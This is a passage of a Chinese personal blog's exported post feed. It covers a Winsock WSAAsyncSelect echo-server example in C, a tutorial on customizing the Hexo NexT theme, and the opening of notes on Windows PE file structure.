<td>欲接收 将要连接 的通知.</td>
</tr>
<tr>
<td>FD_CONNECT</td>
<td>欲接收 已连接好 的通知.</td>
</tr>
<tr>
<td>FD_CLOSE</td>
<td>欲接收 套接口关闭 的通知.</td>
</tr>
</tbody></table>
<h3 id="服务端示例"><a href="#服务端示例" class="headerlink" title="服务端示例"></a>服务端示例</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;winsock2.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;ws2_32.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PORT 8080  <span class="comment">// 定义服务器监听的端口号</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WM_SOCKET WM_USER + 1  <span class="comment">// 定义自定义消息，用于处理socket事件</span></span></span><br><span class="line"></span><br><span class="line">LRESULT CALLBACK <span class="title function_">WndProc</span><span class="params">(HWND, UINT, WPARAM, LPARAM)</span>;  <span class="comment">// 声明窗口过程函数</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> WINAPI <span class="title function_">WinMain</span><span class="params">(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, <span class="type">int</span> nCmdShow)</span> &#123;</span><br><span class="line">    WNDCLASSEX wcex;</span><br><span class="line">    HWND hwnd;</span><br><span class="line">    MSG msg;</span><br><span class="line">    SOCKET server_fd;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">address</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 初始化 Winsock</span></span><br><span class="line">    WSADATA wsaData;</span><br><span class="line">    <span class="type">int</span> iResult = WSAStartup(MAKEWORD(<span class="number">2</span>, <span class="number">2</span>), &amp;wsaData);</span><br><span class="line">    <span class="keyword">if</span> (iResult != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;WSAStartup failed: %d\n&quot;</span>, iResult);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 注册窗口类</span></span><br><span class="line">    wcex.cbSize = <span class="keyword">sizeof</span>(WNDCLASSEX);</span><br><span class="line">    wcex.style = CS_HREDRAW | CS_VREDRAW;</span><br><span class="line">    wcex.lpfnWndProc = WndProc;</span><br><span class="line">    wcex.cbClsExtra = <span class="number">0</span>;</span><br><span class="line">    wcex.cbWndExtra = <span class="number">0</span>;</span><br><span class="line">    wcex.hInstance = hInstance;</span><br><span class="line">    wcex.hIcon = LoadIcon(<span class="literal">NULL</span>, IDI_APPLICATION);</span><br><span class="line">    wcex.hCursor = LoadCursor(<span class="literal">NULL</span>, IDC_ARROW);</span><br><span class="line">    wcex.hbrBackground = (HBRUSH)(COLOR_WINDOW + <span class="number">1</span>);</span><br><span class="line">    wcex.lpszMenuName = <span class="literal">NULL</span>;</span><br><span class="line">    wcex.lpszClassName = <span class="string">&quot;WSAAsyncSelectExample&quot;</span>;</span><br><span class="line">    wcex.hIconSm = LoadIcon(<span class="literal">NULL</span>, IDI_APPLICATION);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!RegisterClassEx(&amp;wcex)) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;RegisterClassEx failed: %d\n&quot;</span>, GetLastError());</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建窗口</span></span><br><span class="line">    hwnd = CreateWindow(<span class="string">&quot;WSAAsyncSelectExample&quot;</span>, <span class="string">&quot;WSAAsyncSelect Example&quot;</span>, WS_OVERLAPPEDWINDOW,</span><br><span class="line">                        CW_USEDEFAULT, <span class="number">0</span>, CW_USEDEFAULT, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, hInstance, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!hwnd) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;CreateWindow failed: %d\n&quot;</span>, GetLastError());</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ShowWindow(hwnd, nCmdShow);</span><br><span class="line">    UpdateWindow(hwnd);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建socket</span></span><br><span class="line">    <span class="keyword">if</span> ((server_fd = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>)) == INVALID_SOCKET) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;socket failed: %d\n&quot;</span>, WSAGetLastError());</span><br><span class="line">        WSACleanup();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 绑定socket</span></span><br><span class="line">    address.sin_family = AF_INET;</span><br><span class="line">    address.sin_addr.s_addr = INADDR_ANY;</span><br><span class="line">    address.sin_port = htons(PORT);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (bind(server_fd, (<span class="keyword">struct</span> sockaddr *)&amp;address, <span class="keyword">sizeof</span>(address)) == SOCKET_ERROR) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;bind failed: %d\n&quot;</span>, WSAGetLastError());</span><br><span class="line">        closesocket(server_fd);</span><br><span class="line">        WSACleanup();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 监听</span></span><br><span class="line">    <span class="keyword">if</span> (listen(server_fd, <span class="number">3</span>) == SOCKET_ERROR) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;listen failed: %d\n&quot;</span>, WSAGetLastError());</span><br><span class="line">        closesocket(server_fd);</span><br><span class="line">        WSACleanup();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 设置WSAAsyncSelect</span></span><br><span class="line">    <span class="keyword">if</span> (WSAAsyncSelect(server_fd, hwnd, WM_SOCKET, FD_ACCEPT | FD_READ | FD_CLOSE) == SOCKET_ERROR) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;WSAAsyncSelect failed: %d\n&quot;</span>, WSAGetLastError());</span><br><span class="line">        closesocket(server_fd);</span><br><span class="line">        WSACleanup();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 消息循环</span></span><br><span class="line">    <span class="keyword">while</span> (GetMessage(&amp;msg, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="number">0</span>)) &#123;</span><br><span class="line">        TranslateMessage(&amp;msg);</span><br><span class="line">        DispatchMessage(&amp;msg);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    closesocket(server_fd);</span><br><span class="line">    WSACleanup();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (<span class="type">int</span>)msg.wParam;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">LRESULT CALLBACK <span class="title function_">WndProc</span><span class="params">(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)</span> &#123;</span><br><span class="line">    SOCKET client_fd;</span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">1024</span>];</span><br><span class="line">    <span class="type">int</span> iResult;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (msg) &#123;</span><br><span class="line">        <span class="keyword">case</span> WM_SOCKET:</span><br><span class="line">            <span class="keyword">if</span> (WSAGETSELECTERROR(lParam)) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Socket error: %d\n&quot;</span>, WSAGETSELECTERROR(lParam));</span><br><span class="line">                closesocket((SOCKET)wParam);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">switch</span> (WSAGETSELECTEVENT(lParam)) &#123;</span><br><span class="line">                <span class="keyword">case</span> FD_ACCEPT:</span><br><span class="line">                    <span class="comment">// 接受新连接</span></span><br><span class="line">                    client_fd = accept((SOCKET)wParam, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">                    <span class="keyword">if</span> (client_fd == INVALID_SOCKET) &#123;</span><br><span class="line">                        <span class="built_in">printf</span>(<span class="string">&quot;accept failed: %d\n&quot;</span>, WSAGetLastError());</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="comment">// 为新连接的socket设置WSAAsyncSelect</span></span><br><span class="line">                        <span class="keyword">if</span> (WSAAsyncSelect(client_fd, hwnd, WM_SOCKET, FD_READ | FD_CLOSE) == SOCKET_ERROR) &#123;</span><br><span class="line">                            <span class="built_in">printf</span>(<span class="string">&quot;WSAAsyncSelect failed: %d\n&quot;</span>, WSAGetLastError());</span><br><span class="line">                            closesocket(client_fd);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">case</span> FD_READ:</span><br><span class="line">                    <span class="comment">// 读取数据</span></span><br><span class="line">                    iResult = recv((SOCKET)wParam, buffer, <span class="keyword">sizeof</span>(buffer), <span class="number">0</span>);</span><br><span class="line">                    <span class="keyword">if</span> (iResult &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                        buffer[iResult] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">                        <span class="built_in">printf</span>(<span class="string">&quot;Received: %s\n&quot;</span>, buffer);</span><br><span class="line">                        send((SOCKET)wParam, buffer, iResult, <span class="number">0</span>);</span><br><span class="line">                    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (iResult == <span class="number">0</span>) &#123;</span><br><span class="line">                        <span class="built_in">printf</span>(<span class="string">&quot;Connection closed\n&quot;</span>);</span><br><span class="line">                        closesocket((SOCKET)wParam);</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="built_in">printf</span>(<span class="string">&quot;recv failed: %d\n&quot;</span>, WSAGetLastError());</span><br><span class="line">                        closesocket((SOCKET)wParam);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">case</span> FD_CLOSE:</span><br><span class="line">                    <span class="comment">// 连接关闭</span></span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;Connection closed\n&quot;</span>);</span><br><span class="line">                    closesocket((SOCKET)wParam);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> WM_DESTROY:</span><br><span class="line">            <span class="comment">// 窗口关闭消息</span></span><br><span class="line">            PostQuitMessage(<span class="number">0</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">return</span> DefWindowProc(hwnd, msg, wParam, lParam);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>C/C++</category>
      </categories>
      <tags>
        <tag>C</tag>
        <tag>Cpp</tag>
        <tag>Internet Programming</tag>
      </tags>
  </entry>
  <entry>
    <title>PolishMyBlog</title>
    <url>/2024/07/13/PolishMyBlog/</url>
    <content><![CDATA[<p>
    <div style="font-size: 55px; font-weight: bold; font-family: 'Times New Roman', serif; color: #5a5a5a">
        hexo × NexT
</div>
<br>
<div style="font-size: 25px; font-weight: bold; font-family: 'Times New Roman', serif; color: #7f7f7f">
    如何修改一个这样↓↓↓的主题
</div>
</p>




<p><img src="/2024/07/13/PolishMyBlog/image-20240713214740457.png" alt="image-20240713214740457"></p>
<span id="more"></span>

<h1 id="NexT"><a href="#NexT" class="headerlink" title="NexT"></a>NexT</h1><p>NexT是hexo的主题插件，首先要安装了hexo</p>
<h2 id="NexT安装和概况"><a href="#NexT安装和概况" class="headerlink" title="NexT安装和概况"></a>NexT安装和概况</h2><p>进入博客的路径，执行一下命令</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/theme-next/hexo-theme-next themes/next</span><br></pre></td></tr></table></figure>

<p><img src="/2024/07/13/PolishMyBlog/image-20240713215651747.png" alt="image-20240713215651747"></p>
<p>找到博客目录下面的config文件</p>
<img src="/2024/07/13/PolishMyBlog/image-20240713215758194.png" alt="image-20240713215758194" style="zoom:67%;">

<p>这里推荐用VS Code直接把整个博客文件夹打开，方便后面直接操作</p>
<img src="/2024/07/13/PolishMyBlog/image-20240713215953724.png" alt="image-20240713215953724" style="zoom:67%;">

<p>这里本来是landscape，改成next即可</p>
<p><img src="/2024/07/13/PolishMyBlog/image-20240713220125493.png" alt="image-20240713220125493"></p>
<p>确保theme文件夹下面有next文件夹</p>
<img src="/2024/07/13/PolishMyBlog/image-20240713220210340.png" alt="image-20240713220210340" style="zoom:50%;">

<p>注意区分<strong>主题配置文件</strong>和<strong>站点配置文件</strong></p>
<img src="/2024/07/13/PolishMyBlog/image-20240713220338496.png" alt="image-20240713220338496" style="zoom:50%;">



<p>打开<strong>主题配置文件</strong>发现里面将近1000行，说明提供的选项还是非常多的</p>
<h2 id="NexT使用"><a href="#NexT使用" class="headerlink" title="NexT使用"></a>NexT使用</h2><p>先扔出一个<a href="https://theme-next.iissnan.com/getting-started.html">使用文档</a>，所有的使用方法基本上都在这里面，这里只教出现在我的博客里的，我这里没有的去前面的文档搜或者搜一下“hexo next 某某功能即可”</p>
<h3 id="4个主题"><a href="#4个主题" class="headerlink" title="4个主题"></a>4个主题</h3><p>首先确定一个主题：<br><img src="/2024/07/13/PolishMyBlog/image-20240713220816585.png" alt="image-20240713220816585"></p>
<p><a href="https://cn.bing.com/">看看四个主题有哪些不同</a>(自己搜一下)，想用哪个主题就把前面的注释删掉，留下一个就可以</p>
<h3 id="菜单"><a href="#菜单" class="headerlink" title="菜单"></a>菜单</h3><img src="/2024/07/13/PolishMyBlog/image-20240713221145429.png" alt="image-20240713221145429" style="zoom:67%;">

<p>在<strong>主题配置文件</strong>中搜索<strong>menu</strong>字段</p>
<img src="/2024/07/13/PolishMyBlog/image-20240713221242044.png" alt="image-20240713221242044" style="zoom:80%;">

<p>需要哪些就打开哪些</p>
<h3 id="头像栏"><a href="#头像栏" class="headerlink" title="头像栏"></a>头像栏</h3><p><img src="/2024/07/13/PolishMyBlog/image-20240713221355666.png" alt="image-20240713221355666"></p>
<p>搜索<strong>avatar</strong>字段</p>
<p><img src="/2024/07/13/PolishMyBlog/image-20240713221436424.png" alt="image-20240713221436424"></p>
<p>URL填一个链接，rounded就是圆形，rotated是旋转</p>
<h3 id="我的NOTICE"><a href="#我的NOTICE" class="headerlink" title="我的NOTICE"></a>我的NOTICE</h3><img src="/2024/07/13/PolishMyBlog/image-20240713221532135.png" alt="image-20240713221532135" style="zoom:67%;">

<p>这个NOTICE其实也是一篇笔记，把它置顶就变成了一个NOTICE或者自己编写的目录</p>
<p>如何置顶：top写大点，<strong>如果置顶多篇</strong>，也可以通过<strong>设置top的大小</strong>决定哪一篇置顶在最上面，哪一篇置顶在第二个</p>
<p><img src="/2024/07/13/PolishMyBlog/image-20240713222515503.png" alt="image-20240713222515503"></p>
<p>这一篇是直接用html写的</p>
<p><img src="/2024/07/13/PolishMyBlog/image-20240713221731239.png" alt="image-20240713221731239"></p>
<p>最下面的图片也是svg图标，这个图标想弄的话直接<strong>去iconfont抢</strong>就完了，找到喜欢的图标，调好颜色，打开开发者工具，找到这个图标的svg标签，复制下来就完了</p>
<p><img src="/2024/07/13/PolishMyBlog/image-20240713221918223.png" alt="image-20240713221918223"></p>
<h3 id="阅读时长统计"><a href="#阅读时长统计" class="headerlink" title="阅读时长统计"></a>阅读时长统计</h3><p>搜索<strong>symbols_count_time</strong>字段</p>
<img src="/2024/07/13/PolishMyBlog/image-20240713222307119.png" alt="image-20240713222307119" style="zoom:67%;">

<p>NexT好像已经直接支持了这个插件，如果不支持的话就下一个</p>
<h3 id="访客量统计"><a href="#访客量统计" class="headerlink" title="访客量统计"></a>访客量统计</h3><p>搜索<strong>busuanzi</strong>字段（不蒜子）</p>
<p><img src="/2024/07/13/PolishMyBlog/image-20240713222424045.png" alt="image-20240713222424045"></p>
<p>这几个都改成true即可</p>
<h3 id="阅读更多按钮"><a href="#阅读更多按钮" class="headerlink" title="阅读更多按钮"></a>阅读更多按钮</h3><p>在想要在主页上折叠的位置，在md中添加这么一个东西就行，不加这个的话，主页上会显示所有的文章，加载起来也非常慢</p>
<p><img src="/2024/07/13/PolishMyBlog/image-20240713230143130.png" alt="image-20240713230143130"></p>
<p><img src="/2024/07/13/PolishMyBlog/image-20240713230336767.png" alt="image-20240713230336767"></p>
<h3 id="圆角"><a href="#圆角" class="headerlink" title="圆角"></a>圆角</h3><img src="/2024/07/13/PolishMyBlog/image-20240713222720381.png" alt="image-20240713222720381" style="zoom:67%;">

<p><strong>Gemini主题</strong>默认是没有圆角的，上网搜也没搜到，通过自己摸索得出了一个方法</p>
<img src="/2024/07/13/PolishMyBlog/image-20240713222919893.png" alt="image-20240713222919893" style="zoom:67%;">

<p>找到这个文件，打开它</p>
<p><img src="/2024/07/13/PolishMyBlog/7d8690bb39833ee325fc75634bd90c8.png" alt="7d8690bb39833ee325fc75634bd90c8"></p>
<p>打开网页看一下，这个东西叫post-block，所以直接在这个文件末尾添加</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.post-block</span> &#123;</span><br><span class="line">  <span class="attribute">border-radius</span> = <span class="number">15px</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>就搞定了</p>
<p><img src="/2024/07/13/PolishMyBlog/image-20240713223143014.png" alt="image-20240713223143014"></p>
<h3 id="关于Mist主题分界线"><a href="#关于Mist主题分界线" class="headerlink" title="关于Mist主题分界线"></a>关于Mist主题分界线</h3><p>Mist主题分界线好像没有，这导致上一篇和下一篇看起来没有分隔，不好看</p>
<p><img src="/2024/07/13/PolishMyBlog/image-20240713223334965.png" alt="image-20240713223334965"></p>
<p>找到这个文件：<img src="/2024/07/13/PolishMyBlog/image-20240713223438190.png" alt="image-20240713223438190" style="zoom:67%;"></p>
<p>在最后添加这一段：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.post</span> &#123;</span><br><span class="line">   <span class="attribute">margin-top</span>: <span class="number">60px</span>;</span><br><span class="line">   <span class="attribute">margin-bottom</span>: <span class="number">60px</span>;</span><br><span class="line">   <span class="attribute">padding</span>: <span class="number">25px</span>;</span><br><span class="line">   -webkit-<span class="attribute">box-shadow</span>: <span class="number">0</span> <span class="number">0</span> <span class="number">5px</span> <span class="built_in">rgba</span>(<span class="number">202</span>, <span class="number">203</span>, <span class="number">203</span>, .<span class="number">5</span>);</span><br><span class="line">   -moz-<span class="attribute">box-shadow</span>: <span class="number">0</span> <span class="number">0</span> <span class="number">5px</span> <span class="built_in">rgba</span>(<span class="number">202</span>, <span class="number">203</span>, <span class="number">204</span>, .<span class="number">5</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<img src="/2024/07/13/PolishMyBlog/4af430ae6918c0c6c0387454921d91b.png" alt="4af430ae6918c0c6c0387454921d91b" style="zoom:50%;">

<p>这样就有边框了，边框颜色太浅不够宽就再调就可以了，学过css的都知道继续怎么折腾</p>
<p>但是发现两篇之间间隔貌似有点大，直接该上面.post中的margin是不行的</p>
<p>找到：<img src="/2024/07/13/PolishMyBlog/4a1c8635858e49dce80ff90580e7bda.png" alt="4a1c8635858e49dce80ff90580e7bda">这个地方（直接搜索就行)</p>
<p>这里本来应该是120px，该小一点间隔就变小了</p>
<img src="/2024/07/13/PolishMyBlog/4af7e4ebdc3f95f47ee6bdc1a1b9cb5.png" alt="4af7e4ebdc3f95f47ee6bdc1a1b9cb5" style="zoom: 50%;">

<h2 id="图片问题"><a href="#图片问题" class="headerlink" title="图片问题"></a>图片问题</h2><p>解决方法很多，这里讲一下我用的<strong>hexo-asset-image</strong>方法</p>
<h3 id="安装hexo-asset-image"><a href="#安装hexo-asset-image" class="headerlink" title="安装hexo-asset-image"></a>安装hexo-asset-image</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install hexo-asset-image --save</span><br></pre></td></tr></table></figure>

<h3 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h3><p>然后修改站点配置文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">post_asset_folder: true</span><br></pre></td></tr></table></figure>

<p>打开<code>node_modules/hexo-asset-image/index.js</code>，将这一大部分复制到这个位置</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">$(<span class="string">&#x27;img&#x27;</span>).<span class="title function_">each</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> ($(<span class="variable language_">this</span>).<span class="title function_">attr</span>(<span class="string">&#x27;src&#x27;</span>)) &#123;</span><br><span class="line">          <span class="comment">// For windows style path, we replace &#x27;\&#x27; to &#x27;/&#x27;.</span></span><br><span class="line">          <span class="keyword">var</span> src = $(<span class="variable language_">this</span>).<span class="title function_">attr</span>(<span class="string">&#x27;src&#x27;</span>).<span class="title function_">replace</span>(<span class="string">&#x27;\\&#x27;</span>, <span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">          <span class="keyword">if</span> (!(<span class="regexp">/http[s]*.*|\/\/.*/</span>.<span class="title function_">test</span>(src)</span><br><span class="line">            || <span class="regexp">/^\s+\//</span>.<span class="title function_">test</span>(src)</span><br><span class="line">            || <span class="regexp">/^\s*\/uploads|images\//</span>.<span class="title function_">test</span>(src))) &#123;</span><br><span class="line">            <span class="comment">// For &quot;about&quot; page, the first part of &quot;src&quot; can&#x27;t be removed.</span></span><br><span class="line">            <span class="comment">// In addition, to support multi-level local directory.</span></span><br><span class="line">            <span class="keyword">var</span> linkArray = link.<span class="title function_">split</span>(<span class="string">&#x27;/&#x27;</span>).<span class="title function_">filter</span>(<span class="keyword">function</span> (<span class="params">elem</span>) &#123;</span><br><span class="line">              <span class="keyword">return</span> elem != <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            &#125;);</span><br><span class="line">            <span class="keyword">var</span> srcArray = src.<span class="title function_">split</span>(<span class="string">&#x27;/&#x27;</span>).<span class="title function_">filter</span>(<span class="keyword">function</span> (<span class="params">elem</span>) &#123;</span><br><span class="line">              <span class="keyword">return</span> elem != <span class="string">&#x27;&#x27;</span> &amp;&amp; elem != <span class="string">&#x27;.&#x27;</span>;</span><br><span class="line">            &#125;);</span><br><span class="line">            <span class="keyword">if</span> (srcArray.<span class="property">length</span> &gt; <span class="number">1</span>)</span><br><span class="line">              srcArray.<span class="title function_">shift</span>();</span><br><span class="line">            src = srcArray.<span class="title function_">join</span>(<span class="string">&#x27;/&#x27;</span>);</span><br><span class="line"></span><br><span class="line">            $(<span class="variable language_">this</span>).<span class="title function_">attr</span>(<span class="string">&#x27;src&#x27;</span>, config.<span class="property">root</span> + link + src);</span><br><span class="line">            <span class="variable language_">console</span>.<span class="property">info</span>&amp;&amp;<span class="variable language_">console</span>.<span class="title function_">info</span>(<span class="string">&quot;update link as:--&gt;&quot;</span>+config.<span class="property">root</span> + link + src);</span><br><span class="line">            <span class="comment">// $(this).attr(&#x27;src&#x27;, src);</span></span><br><span class="line">            <span class="comment">// console.info &amp;&amp; console.info(&quot;update link as:--&gt;&quot; + src);</span></span><br><span class="line">          &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="variable language_">console</span>.<span class="property">info</span> &amp;&amp; <span class="variable language_">console</span>.<span class="title function_">info</span>(<span class="string">&quot;no src attr, skipped...&quot;</span>);</span><br><span class="line">          <span class="variable language_">console</span>.<span class="property">info</span> &amp;&amp; <span class="variable language_">console</span>.<span class="title function_">info</span>($(<span class="variable language_">this</span>));</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;);</span><br></pre></td></tr></table></figure>



<p><img src="/2024/07/13/PolishMyBlog/image-20240713224430913.png" alt="image-20240713224430913"></p>
<h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><h4 id="配置Typora"><a href="#配置Typora" class="headerlink" title="配置Typora"></a>配置Typora</h4><p>这里改成同目录下与本文件同名文件夹</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./$&#123;filename&#125;</span><br></pre></td></tr></table></figure>



<p><img src="/2024/07/13/PolishMyBlog/image-20240713224604996.png" alt="image-20240713224604996"></p>
<h4 id="创建新文章"><a href="#创建新文章" class="headerlink" title="创建新文章"></a>创建新文章</h4><p>使用以下命令创建一篇文章（其实跟自己创一个文件夹再创一个md文件一样，不过这样方便）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo n 名字(不要加.md)</span><br><span class="line">如 hexo n notice</span><br></pre></td></tr></table></figure>

<p>那么在_posts文件夹下面会创建一个名叫notice的文件夹和一个notice.md，这样直接复制图片到md文件中就会在同名的这个文件夹中显示</p>
<p><img src="/2024/07/13/PolishMyBlog/image-20240713224906374.png" alt="image-20240713224906374"></p>
<h4 id="发布"><a href="#发布" class="headerlink" title="发布"></a>发布</h4><p>每次发布前都要执行一下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo clean</span><br></pre></td></tr></table></figure>

<p>清除一下缓存，不然使用hexo-asset-image上传的图片链接会出bug，如果上传的链接出了bug，那就hexo clean一下，然后hexo g，hexo d发布就可以了</p>
<p><img src="/2024/07/13/PolishMyBlog/gifgif.gif" alt="gifgif"></p>
<p>如果不发布图片，只修改文档内容，可以不hexo clean，但是如果图片链接出错了的话，就clean一下再g &amp; d</p>
]]></content>
      <categories>
        <category>Study Essay</category>
      </categories>
      <tags>
        <tag>Hexo NexT</tag>
      </tags>
  </entry>
  <entry>
    <title>PE</title>
    <url>/2024/03/20/PE/</url>
    <content><![CDATA[<h1 id="PE"><a href="#PE" class="headerlink" title="PE"></a>PE</h1><h2 id="PE文件结构"><a href="#PE文件结构" class="headerlink" title="PE文件结构"></a>PE文件结构</h2><h3 id="可执行文件"><a href="#可执行文件" class="headerlink" title="可执行文件"></a>可执行文件</h3><p>可执行文件（executable file）指的是可以由操作系统进行加载执行的文件</p>
<blockquote>
<p>exe。txt之类的不是可执行文件，因为txt文件依赖exe打开。</p>
</blockquote>
<p>可执行文件格式</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Windows平台：	PE(Portable Executable)文件结构</span><br><span class="line">Linux平台：	ELF(Executable and Linking Format)文件结构</span><br></pre></td></tr></table></figure>

<p>应用</p>
<p>&lt;1&gt;病毒与犯病毒</p>
<p>&lt;2&gt;外挂与反外挂</p>
<p>&lt;3&gt;加壳与脱壳（保护与破解）</p>
<p>&lt;4&gt;无源码修改功能、软件汉化等</p>
<span id="more"></span>

<h3 id="PE指纹"><a href="#PE指纹" class="headerlink" title="PE指纹"></a>PE指纹</h3><p><img src="/2024/03/20/PE/image-20240321150124826.png" alt="image-20240321150124826"></p>
<p>开头是<code>4D 5A</code>，往后查到0x3C的位置，这里存着一个地址，<code>F0</code>，从头往后查<code>F0</code>个地址，发现是<code>50 45</code>也就是<strong>PE</strong>，这就是PE指纹。</p>
<p>.sys  .exe  .dll都符合PE文件结构，都有这样一个结构体：</p>
<img src="/2024/03/20/PE/image-20240321151527264.png" alt="image-20240321151527264" style="zoom:50%;">

<h3 id="PE文件的两种状态"><a href="#PE文件的两种状态" class="headerlink" title="PE文件的两种状态"></a>PE文件的两种状态</h3><p>DOS MZ头         DOS块	4个字的PE标识	20个字节标准PE头		224个字节的扩展PE头	40个字节第一个节表里面的数据		40个字节节表里的第二个成员		40个字节第三个成员		40个字节第四个成员		至此标准PE头结束</p>
<img src="/2024/03/20/PE/image-20240321205031681.png" alt="image-20240321205031681" style="zoom:67%;">

<h2 id="DOS头属性说明"><a href="#DOS头属性说明" class="headerlink" title="DOS头属性说明"></a>DOS头属性说明</h2><h3 id="DOS-MZ文件头结构"><a href="#DOS-MZ文件头结构" class="headerlink" title="DOS MZ文件头结构"></a>DOS MZ文件头结构</h3><p><img src="/2024/03/20/PE/image-20240321205435799.png" alt="image-20240321205435799"></p>
